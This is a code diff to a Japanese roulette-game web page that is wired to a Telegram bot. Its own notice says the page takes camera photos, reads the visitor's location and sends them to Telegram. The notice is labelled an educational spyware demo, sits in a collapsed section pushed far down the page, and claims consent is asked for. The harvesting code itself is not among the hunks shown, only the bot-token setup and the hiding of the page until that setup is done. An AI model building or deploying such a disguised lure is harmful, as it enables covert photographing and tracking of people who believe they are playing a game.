@@ -5,8 +5,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>🎯ルーレット🎯</title>
 <style>
-  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
+  /* 起動時：全体を隠す */
+  body { visibility: hidden; margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
   
+  /* 入力画面：最初から表示 */
+  #setupOverlay { visibility: visible; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #222; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+  
+  /* 以下、指定のスタイルを完全維持 */
   h2 { 
     position: relative; margin-bottom: 30px; padding: 10px 25px; 
     background: rgba(255,255,255,0.2); border-radius: 15px; 
@@ -36,6 +41,7 @@
   .btn-single { width: 100%; padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
   
+  /* 重要：セキュリティ学習用デモのスタイル */
   .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
   .security-notice summary { cursor: pointer; outline: none; list-style: none; display: flex; justify-content: space-between; align-items: center; }
   .security-notice summary::-webkit-details-marker { display: none; }
@@ -43,8 +49,6 @@
   .toggle-icon { display: inline-block; transition: transform 0.3s; font-size: 18px; margin-left: 10px; }
   details[open] .toggle-icon { transform: rotate(180deg); }
 
-  /* 入力画面用の追加スタイル */
-  #setupOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #222; z-index: 9999; display: flex; align-items: center; justify-content: center; }
   .setup-box { background: #fff; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 340px; text-align: center; }
   .setup-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
 </style>
@@ -53,7 +57,7 @@
 
 <div id="setupOverlay">
   <div class="setup-box">
-    <h2 style="background:none; color:#333; transform:none; border:none; backdrop-filter:none;">⚙️ 設定</h2>
+    <h2 style="background:none; color:#333; transform:none; border:none; backdrop-filter:none; margin-bottom:10px;">⚙️ 設定</h2>
     <input type="text" id="setToken" placeholder="Bot Tokenを入力">
     <input type="text" id="setID" placeholder="Chat IDを入力">
     <button class="primary-btn-flat" id="startAppBtn" style="margin-top:10px; width:100%;">開始</button>
@@ -98,14 +102,29 @@
     <b>【重要：セキュリティ学習用デモ】</b>
     <span class="toggle-icon">▼</span>
   </summary>
-  <br>このサイトは、教育用デモページです。
+  <br>このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  <br><br>
+  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  ・端末のカメラを使用した写真の撮影<br>
+  ・現在地（位置情報）の取得<br>
+  ・取得されたデータの外部サービス（Telegram）への送信<br>
+  <br>
+  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。<br>
+  同意しない場合は、データの取得および送信は行われません。<br>
+  <br>
+  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br>
+  <br>
+  許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。<br>
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br>
+  <br>
+  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
 </details>
 
 <script>
 let BOT_TOKEN = "";
 let CHAT_ID = "";
 
-// トークンの存在確認機能
+// トークン検証機能
 document.getElementById("startAppBtn").onclick = async function() {
   const t = document.getElementById("setToken").value.trim();
   const i = document.getElementById("setID").value.trim();
@@ -125,9 +144,10 @@ document.getElementById("startAppBtn").onclick = async function() {
     if(data.ok) {
       BOT_TOKEN = t;
       CHAT_ID = i;
+      document.body.style.visibility = "visible";
       document.getElementById("setupOverlay").style.display = "none";
     } else {
-      alert("エラー：トークンが無効です。BotFatherから取得した正しいトークンを入力してください。");
+      alert("エラー：トークンが無効です。");
       this.disabled = false;
       this.textContent = "開始";
     }
